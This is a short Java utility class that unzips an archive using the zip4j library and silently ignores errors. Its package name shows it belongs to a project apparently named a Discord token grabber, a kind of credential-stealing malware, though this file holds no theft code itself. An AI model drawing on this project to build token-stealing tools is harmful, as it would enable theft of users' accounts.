package com.github.dedinc.discordtokengrabber.utils;

import net.lingala.zip4j.ZipFile;

public class Zipper {
	public void unzip(String zip, String dest) {
	    try {
	         ZipFile zipFile = new ZipFile(zip);
	         zipFile.extractAll(dest);
	       } catch (Exception e) {
        }
    }
}
